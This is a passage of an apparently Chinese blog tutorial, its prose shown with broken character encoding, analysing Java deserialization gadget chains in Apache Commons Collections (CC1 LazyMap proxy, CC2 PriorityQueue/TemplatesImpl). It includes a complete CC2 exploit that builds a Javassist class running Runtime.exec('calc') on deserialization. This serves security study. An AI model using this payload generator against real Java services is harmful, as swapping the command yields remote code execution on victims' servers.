</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var6</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>isArray</span><span class=p>()</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>Array</span><span class=p>.</span><span class=na>getLength</span><span class=p>(</span><span class=n>var6</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>var6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>cloneArray</span><span class=p>(</span><span class=n>var6</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=n>var6</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>var1</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>var1</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AnnotationType</span><span class=w> </span><span class=n>var2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>var2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>AnnotationType</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>type</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalArgumentException</span><span class=w> </span><span class=n>var9</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvalidObjectException</span><span class=p>(</span><span class=s>&#34;Non-annotation type in annotation serial stream&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=w> </span><span class=n>var3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var2</span><span class=p>.</span><span class=na>memberTypes</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Iterator</span><span class=w> </span><span class=n>var4</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>memberValues</span><span class=p>.</span><span class=na>entrySet</span><span class=p>().</span><span class=na>iterator</span><span class=p>();</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=p>(</span><span class=n>var4</span><span class=p>.</span><span class=na>hasNext</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=w> </span><span class=n>var5</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=p>)</span><span class=n>var4</span><span class=p>.</span><span class=na>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>var6</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>String</span><span class=p>)</span><span class=n>var5</span><span class=p>.</span><span class=na>getKey</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Class</span><span class=w> </span><span class=n>var7</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Class</span><span class=p>)</span><span class=n>var3</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>var6</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>var7</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Object</span><span class=w> </span><span class=n>var8</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>var5</span><span class=p>.</span><span class=na>getValue</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>var7</span><span class=p>.</span><span class=na>isInstance</span><span class=p>(</span><span class=n>var8</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=p>(</span><span class=n>var8</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>ExceptionProxy</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>var5</span><span class=p>.</span><span class=na>setValue</span><span class=p>((</span><span class=k>new</span><span class=w> </span><span class=n>AnnotationTypeMismatchExceptionProxy</span><span class=p>(</span><span class=n>var8</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;[&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>var8</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;]&#34;</span><span class=p>)).</span><span class=na>setMember</span><span class=p>((</span><span class=n>Method</span><span class=p>)</span><span class=n>var2</span><span class=p>.</span><span class=na>members</span><span class=p>().</span><span class=na>get</span><span class=p>(</span><span class=n>var6</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å‘ç°invokeå‡½æ•°çš„1å¤„ï¼Œè‹¥this.memberValuesæ˜¯LazyMapåˆ™å¯ä»¥è§¦å‘getå‡½æ•°ã€‚</p><p>é‚£ä¹ˆå¯ä»¥åˆ©ç”¨AnnotationInvocationHandlerå®ç°äº†InvocationHandlerï¼Œæ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»çš„ç‰¹ç‚¹ï¼Œåˆ›å»ºä¸€ä¸ªLazyMapçš„ä»£ç†ã€‚ï¼ˆåŠ¨æ€ä»£ç†è¯¦è§<a class=link href=https://javaguide.cn/java/basis/proxy.html#_3-1-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6 target=_blank rel=noopener>JavaåŠ¨æ€ä»£ç†</a>ï¼‰</p><p>å³Expä¸­çš„</p><p>â€‹<code>InvocationHandler ith = (InvocationHandler) ctor.newInstance(SuppressWarnings.class, outerMap)</code>â€‹</p><p>â€‹<code>Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},ith)</code>â€‹</p><p>å½“mapProxyè°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨å°±ä¼šè¢«è½¬å‘åˆ°å®ç°äº†InvocationHandleræ¥å£ç±»çš„AnnotationInvocationHandlerçš„invokeæ–¹æ³•æ¥è°ƒç”¨ã€‚</p><p>è€ŒreadObjectå‡½æ•°çš„2å¤„ï¼Œåˆšå¥½é€šè¿‡mapProxyè°ƒç”¨äº†entrySetæ–¹æ³•ï¼Œæ­¤æ—¶å°±ä¼šè§¦å‘invokeå‡½æ•°çš„1å¤„ã€‚</p><p>å› æ­¤æœ‰Expä»£ç ä¸­çš„<code>Object o = ctor.newInstance(SuppressWarnings.class, mapProxy)</code>â€‹</p><p>è¿™æ ·æ•´ä¸ªè°ƒç”¨é“¾å°±å®Œæˆäº†ã€‚</p><p>psï¼šæˆ‘ä»¬åœ¨TransformerMapé“¾ä¸­æåˆ°äº†æ„é€ AnnotationInvocationHandlerå®ä¾‹æ—¶è¦ç”¨SuppressWarningsç±»ã€Targetç±»æˆ–Retentionç±»ï¼Œä½†LazyMapé“¾åœ¨2å¤„å³å¯è§¦å‘ï¼Œä¸æ¶‰åŠåé¢çš„ä»£ç ï¼Œå› æ­¤æ­¤å¤„ä»»æ„Annotationç±»çš„ç»§æ‰¿ç±»éƒ½å¯ä»¥ã€‚</p><h2 id=commonscollections2>CommonsCollections2</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-1>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>commons-collections4 4.0</p><h3 id=priorityqueueé“¾>PriorityQueueé“¾</h3><h4 id=expå±•ç¤º-1>Expå±•ç¤º</h4><p>commons-collections4 4.0ä¸­ï¼ŒLazyMapå’ŒTransformedMapæ²¡æœ‰äº†decorateæ–¹æ³•ï¼Œå› æ­¤CommonCollections1ä¸­çš„åˆ©ç”¨é“¾æ— æ³•ä½¿ç”¨ï¼Œéœ€è¦å¦æ‰¾åˆ«çš„åˆ©ç”¨é“¾ã€‚</p><p>CommonCollections2çš„æ€è·¯æ˜¯åˆ›å»ºä¸€ä¸ªç±»ï¼Œåœ¨è¯¥ç±»ä¸­æ„é€ ä¸€ä¸ªåŒ…å«payloadçš„staticä»£ç å—ï¼Œé‚£ä¹ˆJVMåŠ è½½ç±»æ—¶ä¼šæ‰§è¡Œè¿™äº›é™æ€çš„ä»£ç å—ï¼Œå°±ä¼šè§¦å‘payloadã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.comparators.TransformingComparator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.PriorityQueue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommomsCollections2</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=o>=</span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=c1>//è¿”å›é»˜è®¤çš„ç±»æ± </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>classPool</span><span class=p>.</span><span class=na>appendClassPath</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>);</span><span class=c1>//æ·»åŠ AbstractTransletçš„æœç´¢è·¯å¾„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>payload</span><span class=o>=</span><span class=n>classPool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;CommonsCollections22222222222&#34;</span><span class=p>);</span><span class=c1>//åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>));</span><span class=w>  </span><span class=c1>//è®¾ç½®å‰é¢åˆ›å»ºçš„CommonsCollections22222222222ç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>//åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ï¼Œè®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ä¸ºruntime</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=o>=</span><span class=n>payload</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=c1>//è½¬æ¢ä¸ºbyteæ•°ç»„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>templatesImpl</span><span class=o>=</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=p>).</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}).</span><span class=na>newInstance</span><span class=p>();</span><span class=c1>//åå°„åˆ›å»ºTemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_bytecodes&#34;</span><span class=p>);</span><span class=c1>//åå°„è·å–templatesImplçš„_bytecodeså­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytes</span><span class=p>});</span><span class=c1>//å°†templatesImplä¸Šçš„_bytecodeså­—æ®µè®¾ç½®ä¸ºruntimeçš„byteæ•°ç»„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field1</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_name&#34;</span><span class=p>);</span><span class=c1>//åå°„è·å–templatesImplçš„_nameå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field1</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field1</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=s>&#34;test&#34;</span><span class=p>);</span><span class=c1>//å°†templatesImplä¸Šçš„_nameå­—æ®µè®¾ç½®ä¸ºtest</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvokerTransformer</span><span class=w> </span><span class=n>transformer</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;newTransformer&#34;</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{},</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransformingComparator</span><span class=w> </span><span class=n>comparator</span><span class=w> </span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>TransformingComparator</span><span class=p>(</span><span class=n>transformer</span><span class=p>);</span><span class=c1>//ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ä¼ å…¥transformerå¯¹è±¡</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=c1>//æ·»åŠ æ•°å­—1æ’å…¥æ­¤ä¼˜å…ˆçº§é˜Ÿåˆ—</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=c1>//æ·»åŠ æ•°å­—1æ’å…¥æ­¤ä¼˜å…ˆçº§é˜Ÿåˆ—</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field2</span><span class=o>=</span><span class=n>queue</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;comparator&#34;</span><span class=p>);</span><span class=c1>//è·å–PriorityQueueçš„comparatorå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field2</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field2</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=n>comparator</span><span class=p>);</span><span class=c1>//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field3</span><span class=o>=</span><span class=n>queue</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;queue&#34;</span><span class=p>);</span><span class=c1>//è·å–queueçš„queueå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field3</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field3</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>templatesImpl</span><span class=p>,</span><span class=n>templatesImpl</span><span class=p>});</span><span class=c1>//è®¾ç½®queueçš„queueå­—æ®µå†…å®¹Objectæ•°ç»„ï¼Œå†…å®¹ä¸ºtemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>queue</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>inputStream</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=expæ„é€ åˆ†æ-2>Expæ„é€ åˆ†æ</h4><h5 id=åˆ©ç”¨é“¾å±•ç¤º>åˆ©ç”¨é“¾å±•ç¤º</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Gadget</span><span class=w> </span><span class=n>chain</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>PriorityQueue</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=p>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>					</span><span class=n>TransformingComparator</span><span class=p>.</span><span class=na>compare</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>						</span><span class=n>InvokerTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>							</span><span class=n>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>								</span><span class=n>Runtime</span><span class=p>.</span><span class=na>exec</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h5 id=invokertransformer-1>InvokerTransformer</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// org. apache. commons. collections. functors. InvokerTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>iMethodName</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=n>iParamTypes</span><span class=p>;</span><span class=w>
